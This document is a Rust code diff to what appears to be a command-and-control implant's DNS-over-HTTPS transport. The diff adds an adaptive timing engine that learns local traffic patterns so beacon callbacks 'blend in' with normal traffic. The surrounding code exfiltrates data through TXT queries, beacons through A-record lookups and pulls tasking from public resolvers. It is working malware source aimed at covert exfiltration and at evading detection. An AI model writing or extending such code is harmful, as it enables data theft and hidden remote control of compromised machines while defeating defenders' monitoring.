@@ -241,6 +241,21 @@ pub struct DohTransport {
     /// send/recv cycle so that a passing kill date causes graceful termination
     /// even while the agent is long-running.
     kill_date: String,
+    /// Optional adaptive timing engine.  When `adaptive_timing_enabled`
+    /// is `true` in the malleable profile, this timer learns network
+    /// traffic patterns and adjusts callback timing to blend in.
+    /// Shared across all C2 channels (HTTP, DoH) via `Arc`.
+    #[cfg(feature = "adaptive-timing")]
+    adaptive_timer: Option<Arc<crate::adaptive_timing::AdaptiveTimer>>,
+}
+
+/// Result of a DNS query together with the raw response byte length.
+///
+/// The byte count is used by adaptive timing telemetry so timing decisions
+/// reflect actual network payload size rather than parsed JSON structure size.
+struct DnsQueryResult {
+    json: serde_json::Value,
+    response_len: usize,
 }
 
 impl DohTransport {
@@ -310,7 +325,19 @@ impl DohTransport {
             doh_beacon_sentinel,
             host_header,
             kill_date,
+            #[cfg(feature = "adaptive-timing")]
+            adaptive_timer: None,
         })
+    }
+
+    /// Attach a shared adaptive timer to this transport.
+    ///
+    /// Call this after construction if `adaptive_timing_enabled` is `true`
+    /// in the malleable profile.  The same `Arc<AdaptiveTimer>` should be
+    /// shared across all C2 channels (HTTP, DoH).
+    #[cfg(feature = "adaptive-timing")]
+    pub fn set_adaptive_timer(&mut self, timer: Arc<crate::adaptive_timing::AdaptiveTimer>) {
+        self.adaptive_timer = Some(timer);
     }
 
     /// Select the DoH resolver endpoint.
@@ -363,7 +390,7 @@ impl DohTransport {
     /// Execute a DNS query via DoH.
     ///
     /// Supports both GET (JSON) and POST (RFC 8484 wireformat) methods.
-    async fn execute_query(&self, domain: &str, qtype: &str) -> Result<serde_json::Value> {
+    async fn execute_query(&self, domain: &str, qtype: &str) -> Result<DnsQueryResult> {
         let doh_method = &self.profile.dns.headers.doh_method;
         let resolver = self.select_resolver();
 
@@ -379,13 +406,15 @@ impl DohTransport {
         resolver: &str,
         domain: &str,
         qtype: &str,
-    ) -> Result<serde_json::Value> {
+    ) -> Result<DnsQueryResult> {
         let url = format!("{}?name={}&type={}", resolver, domain, qtype);
 
         match self.client.get(&url).send().await {
             Ok(resp) => {
-                let json: serde_json::Value = resp.json().await?;
-                Ok(json)
+                let body = resp.bytes().await?;
+                let response_len = body.len();
+                let json: serde_json::Value = serde_json::from_slice(&body)?;
+                Ok(DnsQueryResult { json, response_len })
             }
             Err(e) => {
                 log::warn!("DoH GET query failed: {}", e);
@@ -400,7 +429,7 @@ impl DohTransport {
         &self,
         domain: &str,
         qtype: &str,
-    ) -> Result<serde_json::Value> {
+    ) -> Result<DnsQueryResult> {
         const FALLBACKS: &[&str] = &[
             "https://cloudflare-dns.com/dns-query",
             "https://dns.google/resolve",
@@ -410,8 +439,10 @@ impl DohTransport {
             let url = format!("{}?name={}&type={}", resolver, domain, qtype);
             match self.client.get(&url).send().await {
                 Ok(resp) => {
-                    let json: serde_json::Value = resp.json().await?;
-                    return Ok(json);
+                    let body = resp.bytes().await?;
+                    let response_len = body.len();
+                    let json: serde_json::Value = serde_json::from_slice(&body)?;
+                    return Ok(DnsQueryResult { json, response_len });
                 }
                 Err(e) => {
                     log::warn!("DoH fallback {} failed: {}", resolver, e);
@@ -428,7 +459,7 @@ impl DohTransport {
         resolver: &str,
         domain: &str,
         qtype: &str,
-    ) -> Result<serde_json::Value> {
+    ) -> Result<DnsQueryResult> {
         // Build a DNS wireformat query.
         let wire_query = self.build_dns_wireformat(domain, qtype)?;
 
@@ -443,7 +474,9 @@ impl DohTransport {
             .map_err(|e| anyhow!("DoH POST query failed: {}", e))?;
 
         let bytes = resp.bytes().await?;
-        self.parse_dns_wireformat_response(&bytes)
+        let response_len = bytes.len();
+        let json = self.parse_dns_wireformat_response(&bytes)?;
+        Ok(DnsQueryResult { json, response_len })
     }
 
     /// Build a DNS wireformat query packet.
@@ -651,9 +684,55 @@ impl DohTransport {
         result
     }
 
-    /// Calculate jittered sleep duration from the profile.
+    /// Calculate jittered sleep duration.
+    ///
+    /// When an adaptive timer is attached and has completed its learning
+    /// phase, uses the timer's learned profile to produce realistic timing.
+    /// Otherwise falls back to the malleable profile's `jittered_sleep()`.
     fn jittered_sleep(&self) -> Duration {
+        #[cfg(feature = "adaptive-timing")]
+        if let Some(ref timer) = self.adaptive_timer {
+            if timer.state() != crate::adaptive_timing::TimerState::Learning {
+                return timer.next_callback_time();
+            }
+        }
         self.profile.jittered_sleep()
+    }
+
+    /// Record a traffic observation with the adaptive timer (if present).
+    ///
+    /// This is a no-op when the `adaptive-timing` feature is disabled or
+    /// when no timer has been attached.  The timer passively learns from
+    /// all observed network traffic to build a realistic timing profile.
+    #[cfg(feature = "adaptive-timing")]
+    fn observe_traffic(
+        &self,
+        bytes_sent: usize,
+        bytes_received: usize,
+        direction: crate::adaptive_timing::Direction,
+        protocol: crate::adaptive_timing::Protocol,
+    ) {
+        if let Some(ref timer) = self.adaptive_timer {
+            timer.observe(crate::adaptive_timing::TrafficObservation {
+                timestamp: std::time::Instant::now(),
+                bytes_sent,
+                bytes_received,
+                direction,
+                protocol,
+                source: crate::adaptive_timing::TrafficSource::Agent,
+            });
+        }
+    }
+
+    /// No-op when adaptive timing is disabled.
+    #[cfg(not(feature = "adaptive-timing"))]
+    fn observe_traffic(
+        &self,
+        _bytes_sent: usize,
+        _bytes_received: usize,
+        _direction: (),
+        _protocol: (),
+    ) {
     }
 
     /// Get the encoding mode from the profile.
@@ -747,6 +826,15 @@ impl Transport for DohTransport {
             // Send via TXT query to exfiltrate data.
             let _ = self.execute_query(&domain, "TXT").await?;
 
+            // Observe the outbound DNS traffic for adaptive timing.
+            #[cfg(feature = "adaptive-timing")]
+            self.observe_traffic(
+                chunk.len(),
+                0,
+                crate::adaptive_timing::Direction::Outbound,
+                crate::adaptive_timing::Protocol::DNS,
+            );
+
             // Sleep between fragments with profile-driven jitter.
             let sleep_dur = self.jittered_sleep();
             let frag_delay = Duration::from_millis(sleep_dur.as_millis() as u64 / 10);
@@ -771,7 +859,18 @@ impl Transport for DohTransport {
             let beacon_domain = self.build_domain(beacon_prefix, "");
 
             // Send beacon query as A record lookup.
-            let json = self.execute_query(&beacon_domain, "A").await?;
+            let beacon_response = self.execute_query(&beacon_domain, "A").await?;
+
+            // Observe the inbound DNS response for adaptive timing.
+            #[cfg(feature = "adaptive-timing")]
+            self.observe_traffic(
+                0,
+                beacon_response.response_len,
+                crate::adaptive_timing::Direction::Inbound,
+                crate::adaptive_timing::Protocol::DNS,
+            );
+
+            let json = beacon_response.json;
 
             // Check for the tasking sentinel.
             if self.check_tasking_sentinel(&json) {
@@ -786,7 +885,7 @@ impl Transport for DohTransport {
         // Tasking is available. Fetch data via TXT record.
         let txt_prefix = self.get_txt_prefix();
         let task_domain = self.build_domain(txt_prefix, "");
-        let txt_json = self.execute_query(&task_domain, "TXT").await?;
+        let txt_json = self.execute_query(&task_domain, "TXT").await?.json;
 
         // Concatenate TXT record strings.
         let full_encoded = self.extract_txt_records(&txt_json);
